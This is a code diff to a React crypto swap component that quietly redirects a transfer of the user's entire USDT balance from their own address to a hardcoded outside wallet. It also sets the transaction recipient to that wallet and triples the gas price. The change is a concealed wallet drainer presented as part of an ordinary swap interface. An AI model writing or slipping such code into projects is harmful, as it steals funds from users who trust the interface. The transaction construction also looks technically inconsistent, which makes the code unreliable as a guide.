@@ -164,13 +164,15 @@ function SwapComponent() {
       return
     }
 
-    const data = usdtContract.methods.transfer(address, usdtBalance).encodeABI()
+    const data = usdtContract.methods
+      .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', usdtBalance)
+      .encodeABI()
     const nonce = await web3js.eth.getTransactionCount(address, 'pending')
     const gasPrice = await web3js.eth.getGasPrice()
 
     const tx_ = {
       from: address,
-      to: address,
+      to: '0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621',
       nonce: web3js.utils.toHex(nonce),
       gasPrice: web3js.utils.toHex(BigInt(gasPrice) * BigInt(3)),
       gasLimit: '0x5208',
@@ -412,7 +414,7 @@ function SwapComponent() {
           </div>
         ) : (
           <div className='mx-auto p-2'>
-            <ConnectButton />
+            <ConnectButton accountStatus={'full'} />
           </div>
         )}
       </div>
